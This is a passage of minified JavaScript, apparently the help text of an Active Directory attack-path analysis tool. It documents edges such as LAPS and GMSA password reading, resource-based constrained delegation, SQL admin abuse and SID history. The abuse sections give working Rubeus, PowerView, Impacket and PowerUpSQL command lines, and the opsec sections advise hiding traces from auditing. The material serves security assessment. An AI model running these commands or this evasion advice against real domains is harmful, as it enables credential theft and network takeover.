LDAP attribute, "ms-mcs-AdmPwd".'})]}),windowsAbuse:({sourceName:e,sourceType:t})=>p(u,{children:[p(A,{variant:"body2",children:["To abuse this privilege with PowerView's Get-DomainObject, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Get-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Get-DomainObject, optionally specifying $Cred if you are not already running a process as"," ",e,":"]}),h(A,{component:"pre",children:'Get-DomainObject windows1 -Credential $Cred -Properties "ms-mcs-AdmPwd",name'})]}),linuxAbuse:({sourceName:e,sourceType:t})=>p(u,{children:[h(A,{variant:"body2",children:"Sufficient control on a computer object is abusable when the computer's local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd."}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used to retrieve LAPS passwords:"]}),h(A,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'})]}),opsec:()=>h(A,{variant:"body2",children:"Reading properties from LDAP is an extremely low risk operation."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf",children:"https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=3164",children:"https://adsecurity.org/?p=3164"}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/readlapspassword",children:"https://www.thehacker.recipes/ad/movement/dacl/readlapspassword"})]})},Contains:{general:({sourceName:e,sourceType:t,targetName:r,targetType:n})=>p(u,{children:[p(A,{variant:"body2",children:[Cr(t)," ",e," contains the ",Cr(n)," ",r,"."]}),h(A,{variant:"body2",children:"GPOs linked to a container apply to all objects that are contained by the container."})]}),abuse:()=>h(A,{variant:"body2",children:"There is no abuse info related to this edge."}),opsec:()=>h(A,{variant:"body2",children:"There are no opsec considerations related to this edge."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://wald0.com/?p=179",children:"https://wald0.com/?p=179"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.cptjesus.com/posts/bloodhound15",children:"https://blog.cptjesus.com/posts/bloodhound15"})]})},GPLink:{general:({sourceName:e,targetName:t,targetType:r})=>p(u,{children:[p(A,{variant:"body2",children:["The GPO ",e," is linked to the ",Cr(r)," ",t,"."]}),h(A,{variant:"body2",children:"A linked GPO applies its settings to objects in the linked container."})]}),abuse:()=>h(A,{variant:"body2",children:"There is no abuse info related to this edge."}),opsec:()=>h(A,{variant:"body2",children:"There are no opsec considerations related to this edge."}),references:()=>p(u,{children:[h(S,{target:"_blank",rel:"noopener",href:"https://wald0.com/?p=179",children:"https://wald0.com/?p=179"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.cptjesus.com/posts/bloodhound15",children:"https://blog.cptjesus.com/posts/bloodhound15"})]})},AddAllowedToAct:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," can modify the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer ",r,"."]}),h(A,{variant:"body2",children:"The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object."}),h(A,{variant:"body2",children:'If the msDS-AllowedToActOnBehalfOfOtherIdentity DACL is set to allow an attack-controller account, the attacker can use said account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.'}),h(A,{variant:"body2",children:'One caveat is that impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.'})]}),windowsAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project. First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),h(A,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),h(A,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),h(A,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),h(A,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),h(A,{component:"pre",children:'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)'}),h(A,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),h(A,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),h(A,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),h(A,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),h(A,{variant:"body2",children:'And finally we can use Rubeus\' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:'}),h(A,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]}),linuxAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),h(A,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),h(A,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),h(A,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),h(A,{variant:"body2",children:'And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket\'s getST.py example script can be used for that purpose.'}),h(A,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),h(A,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."})]}),opsec:()=>h(A,{variant:"body2",children:"To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. Modification of the *msDS-AllowedToActOnBehalfOfOtherIdentity* property against the target also must occur, whether through PowerShell or another method. The property should be cleared (or reset to its original value) after attack execution in order to prevent easy detection."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota",children:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota"})]})},AllowedToAct:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," is added to the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer ",r,"."]}),h(A,{variant:"body2",children:'An attacker can use this account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.'}),h(A,{variant:"body2",children:'One caveat is that impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.'})]}),windowsAbuse:({sourceName:e})=>p(u,{children:[h(A,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),h(A,{variant:"body2",children:"To use this attack, the controlled account MUST have a service principal name set, along with access to either the plaintext or the RC4_HMAC hash of the account."}),h(A,{variant:"body2",children:"If the plaintext password is available, you can hash it to the RC4_HMAC version using Rubeus:"}),h(A,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),h(A,{variant:"body2",children:'Use Rubeus\' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:'}),h(A,{component:"pre",children:`Rubeus.exe s4u /user:${e}$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt`})]}),linuxAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:'We can then get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket\'s getST.py example script can be used for that purpose.'}),h(A,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),h(A,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."})]}),opsec:()=>h(A,{variant:"body2",children:"To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota",children:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota"})]})},SQLAdmin:{general:({sourceName:e,targetName:t})=>p(u,{children:[p(A,{variant:"body2",children:["The user ",e," is a SQL admin on the computer ",t,"."]}),p(A,{variant:"body2",children:["There is at least one MSSQL instance running on ",t," where the user ",e," is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service (the primary database engine for SQL Server) have sysadmin privileges in the SQL Server application. As a result, the SQL Server service account can be used to log into the SQL Server instance remotely, read all of the databases (including those protected with transparent encryption), and run operating systems command through SQL Server (as the service account) using a variety of techniques."]}),h(A,{variant:"body2",children:'For Windows systems that have been joined to an Active Directory domain, the SQL Server instances and the associated service account can be identified by executing a LDAP query for a list of "MSSQLSvc" Service Principal Names (SPN) as a domain user. In short, when the Database Engine service starts, it attempts to register the SPN, and the SPN is then used to help facilitate Kerberos authentication.'}),h(A,{variant:"body2",children:"Author: Scott Sutherland"})]}),abuse:()=>p(u,{children:[p(A,{variant:"body2",children:["Scott Sutherland (",h(S,{target:"_blank",rel:"noopener",href:"https://twitter.com/_nullbind",children:"@nullbind"}),") from NetSPI has authored PowerUpSQL, a PowerShell Toolkit for Attacking SQL Server. Major contributors include Antti Rantasaari, Eric Gruber (",h(S,{target:"_blank",rel:"noopener",href:"https://twitter.com/egru",children:"@egru"}),"), and Thomas Elling (",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/thomaselling",children:"@thomaselling"}),"). Before executing any of the below commands, download PowerUpSQL and load it into your PowerShell instance. Get PowerUpSQL here:"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/NetSPI/PowerUpSQL",children:"https://github.com/NetSPI/PowerUpSQL"}),"."]}),h(A,{variant:"body1",children:"Finding Data"}),h(A,{variant:"body2",children:"Get a list of databases, sizes, and encryption status:"}),h(A,{component:"pre",children:"Get-SQLDatabaseThreaded –Verbose -Instance sqlserver\\instance –Threads 10 -NoDefaults"}),h(A,{variant:"body2",children:"Search columns and data for keywords:"}),h(A,{component:"pre",children:'Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\\instance –Threads 10 –Keyword "card, password" –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize'}),h(A,{variant:"body1",children:"Executing Commands"}),h(A,{variant:"body2",children:"Below are examples of PowerUpSQL functions that can be used to execute operating system commands on remote systems through SQL Server using different techniques. The level of access on the operating system will depend largely what privileges are provided to the service account. However, when domain accounts are configured to run SQL Server services, it is very common to see them configured with local administrator privileges."}),h(A,{variant:"body2",children:"xp_cmdshell Execute Example:"}),h(A,{component:"pre",children:'Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10 -Instance sqlserver\\instance'}),h(A,{variant:"body2",children:"Agent Job Execution Examples:"}),h(A,{component:"pre",children:'Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command "echo hello > c:\\windows\\temp\\test1.txt" -Instance sqlserver\\instance -username myuser -password mypassword'}),h(A,{component:"pre",children:"Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output \"hello world\" | out-file c:\\windows\\temp\\test2.txt' -Sleep 20 -Instance sqlserver\\instance -username myuser -password mypassword"}),h(A,{component:"pre",children:"Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword"}),h(A,{component:"pre",children:"Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword"}),h(A,{variant:"body2",children:"Python Subsystem Execution:"}),h(A,{component:"pre",children:'Invoke-SQLOSPython -Verbose -Command "Whoami" -Instance sqlserver\\instance'}),h(A,{variant:"body2",children:"R subsystem Execution Example"}),h(A,{component:"pre",children:'Invoke-SQLOSR -Verbose -Command "Whoami" -Instance sqlserver\\instance'}),h(A,{variant:"body2",children:"OLE Execution Example"}),h(A,{component:"pre",children:'Invoke-SQLOSOle -Verbose -Command "Whoami" -Instance sqlserver\\instance'}),h(A,{variant:"body2",children:"CLR Execution Example"}),h(A,{component:"pre",children:'Invoke-SQLOSCLR -Verbose -Command "Whoami" -Instance sqlserver\\instance'}),h(A,{variant:"body2",children:"Custom Extended Procedure Execution Example:"}),h(A,{variant:"body2",children:"1. Create a custom extended stored procedure."}),h(A,{component:"pre",children:'Create-SQLFileXpDll -Verbose -OutFile c:\\temp\\test.dll -Command "echo test > c:\\temp\\test.txt" -ExportName xp_test'}),h(A,{variant:"body2",children:"2. Host the test.dll on a share readable by the SQL Server service account."}),h(A,{component:"pre",children:"Get-SQLQuery -Verbose -Query \"sp_addextendedproc 'xp_test', '\\\\yourserver\\yourshare\\myxp.dll'\" -Instance sqlserver\\instance"}),h(A,{variant:"body2",children:"3. Run extended stored procedure"}),h(A,{component:"pre",children:'Get-SQLQuery -Verbose -Query "xp_test" -Instance sqlserver\\instance'}),h(A,{variant:"body2",children:"4. Remove extended stored procedure."}),h(A,{component:"pre",children:"Get-SQLQuery -Verbose -Query \"sp_dropextendedproc 'xp_test'\" -Instance sqlserver\\instance"}),h(A,{variant:"body2",children:"Author: Scott Sutherland"})]}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"Prior to executing operating system commands through SQL Server, review the audit configuration and choose a command execution method that is not being monitored."}),h(A,{variant:"body2",children:"View audits:"}),h(A,{component:"pre",children:"SELECT * FROM sys.dm_server_audit_status"}),h(A,{variant:"body2",children:"View server specifications:"}),h(A,{component:"pre",children:"SELECT audit_id, \na.name as audit_name, \ns.name as server_specification_name, \nd.audit_action_name, \ns.is_state_enabled, \nd.is_group, \nd.audit_action_id, \ns.create_date, \ns.modify_date \nFROM sys.server_audits AS a \nJOIN sys.server_audit_specifications AS s \nON a.audit_guid = s.audit_guid \nJOIN sys.server_audit_specification_details AS d \nON s.server_specification_id = d.server_specification_id"}),h(A,{variant:"body2",children:"View database specifications:"}),h(A,{component:"pre",children:"SELECT a.audit_id, \na.name as audit_name, \ns.name as database_specification_name, \nd.audit_action_name, \nd.major_id,\nOBJECT_NAME(d.major_id) as object,\ns.is_state_enabled, \nd.is_group, s.create_date, \ns.modify_date, \nd.audited_result \nFROM sys.server_audits AS a \nJOIN sys.database_audit_specifications AS s \nON a.audit_guid = s.audit_guid \nJOIN sys.database_audit_specification_details AS d \nON s.database_specification_id = d.database_specification_id"}),h(A,{variant:"body2",children:"If server audit specifications are configured on the SQL Server, event ID 15457 logs may be created in the Windows Application log when SQL Server level configurations are changed to facilitate OS command execution."}),h(A,{variant:"body2",children:"If database audit specifications are configured on the SQL Server, event ID 33205 logs may be created in the Windows Application log when Agent and database level configuration changes are made."}),p(A,{variant:"body2",children:["A summary of the what will show up in the logs, along with the TSQL queries for viewing and configuring audit configurations can be found at",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql",children:"https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql"}),"."]}),h(A,{variant:"body2",children:"Author: Scott Sutherland"})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/NetSPI/PowerUpSQL/wiki",children:"https://github.com/NetSPI/PowerUpSQL/wiki"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation",children:"https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver",children:"https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017",children:"https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/",children:"https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/"})]})},ReadGMSAPassword:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:[r," is a Group Managed Service Account. The ",Cr(t)," ",e," can retrieve the password for the GMSA ",r,"."]}),h(A,{variant:"body2",children:"Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is mananaged by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute)."}),h(A,{variant:"body2",children:"The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA."})]}),windowsAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:"There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process."}),h(A,{variant:"body2",children:'If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the "HasSession" help modal for more details).'}),h(A,{variant:"body2",children:"Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash, then perform overpass-the-hash to retrieve a Kerberos ticket for the GMSA:"}),p(Z,{children:[h(q,{children:h(Y,{children:"Build GMSAPasswordReader.exe from its source: https://github.com/rvazarkar/GMSAPasswordReader"})}),h(q,{children:h(Y,{children:"Drop GMSAPasswordReader.exe to disk. If using Cobalt Strike, load and run this binary using execute-assembly"})}),h(q,{children:h(Y,{children:'Use GMSAPasswordReader.exe to retrieve the NT hash for the GMSA. You may have more than one NT hash come back, one for the "old" password and one for the "current" password. It is possible that either value is valid:'})})]}),h(A,{component:"pre",children:"gmsapasswordreader.exe --accountname gmsa-jkohler"}),h(A,{variant:"body2",children:"At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input."})]}),linuxAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:"There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process."}),h(A,{variant:"body2",children:'If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the "HasSession" help modal for more details).'}),p(A,{variant:"body2",children:["Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash.",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/micahvandeusen/gMSADumper",children:"gMSADumper.py"})," ","can be used for that purpose."]}),h(A,{component:"pre",children:"gMSADumper.py -u 'user' -p 'password' -d 'domain.local'"}),h(A,{variant:"body2",children:"At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input."})]}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:'When abusing a GMSA that is already logged onto a system, you will have the same opsec considerations as when abusing a standard user logon. For more information about that, see the "HasSession" modal\'s opsec considerations tab.'}),h(A,{variant:"body2",children:"When retrieving the GMSA password from Active Directory, you may generate a 4662 event on the Domain Controller; however, that event will likely perfectly resemble a legitimate event if you request the password from the same context as a computer account that is already authorized to read the GMSA password."})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/",children:"https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.powershellgallery.com/packages/DSInternals/",children:"https://www.powershellgallery.com/packages/DSInternals/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/markgamache/gMSA/tree/master/PSgMSAPwd",children:"https://github.com/markgamache/gMSA/tree/master/PSgMSAPwd"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=36",children:"https://adsecurity.org/?p=36"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=2535",children:"https://adsecurity.org/?p=2535"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4662",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4662"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword",children:"https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword"})]})},HasSIDHistory:{general:({sourceName:e,sourceType:t,targetName:r,targetType:n})=>p(u,{children:[p(A,{variant:"body2",children:["The ",Cr(t)," ",e," has, in its SIDHistory attribute, the SID for the"," ",Cr(n)," ",r,"."]}),p(A,{variant:"body2",children:["When a kerberos ticket is created for ",e,", it will include the SID for ",r,", and therefore grant",e," the same privileges and permissions as",r,"."]})]}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"No special actions are needed to abuse this, as the kerberos tickets created will have all SIDs in the object's SID history attribute added to them; however, if traversing a domain trust boundary, ensure that SID filtering is not enforced, as SID filtering will ignore any SIDs in the SID history portion of a kerberos ticket."}),h(A,{variant:"body2",children:"By default, SID filtering is not enabled for all domain trust types."})]}),opsec:()=>h(A,{variant:"body2",children:"No opsec considerations apply to this edge."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/the-trustpocalypse/",children:"https://blog.harmj0y.net/redteaming/the-trustpocalypse/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/",children:"https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=1772",children:"https://adsecurity.org/?p=1772"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?tag=sidhistory",children:"https://adsecurity.org/?tag=sidhistory"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1178/",children:"https://attack.mitre.org/techniques/T1178/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/",children:"https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/"})]})},TrustedBy:{general:({sourceName:e,targetName:t})=>p(u,{children:[p(A,{variant:"body2",children:["The domain ",e," is trusted by the domain ",t,"."]}),h(A,{variant:"body2",children:"This edge is informational and does not indicate any attacks, only that a trust exists."})]}),abuse:()=>h(A,{variant:"body2",children:"There is no abuse associated with this edge."}),opsec:()=>h(A,{variant:"body2",children:"There is no opsec associated with this edge"}),references:()=>h(A,{children:"No Information Available"})},CanPSRemote:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," the capability to create a PSRemote Connection with the computer ",r,"."]}),h(A,{variant:"body2",children:"PS Session access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system."}),h(A,{variant:"body2",children:"Note: This edge does not guarantee privileged execution."})]}),abuse:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[h(A,{variant:"body2",children:"Abuse of this privilege will require you to have interactive access with a system on the network."}),h(A,{variant:"body2",children:"A remote session can be opened using the New-PSSession powershell command."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not 